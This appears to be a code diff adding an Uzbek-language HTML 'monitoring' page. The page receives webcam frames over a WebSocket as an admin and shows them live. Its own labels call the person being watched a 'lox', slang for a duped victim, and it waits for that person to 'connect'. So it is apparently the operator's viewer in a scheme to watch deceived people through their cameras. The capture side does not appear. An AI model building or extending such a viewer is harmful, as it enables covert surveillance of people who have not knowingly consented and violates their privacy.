@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <title>Developper Core - Monitoring</title>
+    <style>
+        body { 
+            margin: 0; 
+            background-color: #000; 
+            color: #fff; 
+            font-family: sans-serif; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+        }
+        h2 { 
+            margin-bottom: 20px; 
+            letter-spacing: 1px;
+        }
+        /* developper core.png dagi oq ramkali asosiy monitoring qutisi */
+        .monitor-box { 
+            width: 80%; 
+            max-width: 800px; 
+            aspect-ratio: 16/9; 
+            border: 5px solid #fff; 
+            background-color: #111; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            position: relative; 
+            overflow: hidden; 
+        }
+        /* Jonli kamera rasmi */
+        #live-stream { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: contain; 
+            transform: scaleX(-1); /* Oyna effekti */
+            display: none; 
+        }
+        .no-user { 
+            position: absolute; 
+            color: #666; 
+            font-size: 20px; 
+        }
+    </style>
+</head>
+<body>
+
+    <h2>Loxni yuzini korish</h2>
+    
+    <div class="monitor-box">
+        <span class="no-user" id="status">Lox ulanishi kutilmoqda...</span>
+        <img id="live-stream" src="" alt="Live Stream">
+    </div>
+
+    <script>
+        const img = document.getElementById('live-stream');
+        const statusText = document.getElementById('status');
+
+        const wsProtocol = window.location.protocol === "https:" ? "wss://" : "ws://";
+        const ws = new WebSocket(wsProtocol + window.location.host + "/ws?role=admin");
+
+        ws.onmessage = (event) => {
+            if (statusText.style.display !== 'none') {
+                statusText.style.display = 'none';
+                img.style.display = 'block';
+            }
+            
+            // Kelgan kadrni srazu ekranga chiqaramiz
+            img.src = event.data;
+        };
+
+        ws.onclose = () => {
+            statusText.style.display = 'block';
+            statusText.innerText = "Server bilan aloqa uzildi.";
+            img.style.display = 'none';
+        };
+    </script>
+</body>
+</html>
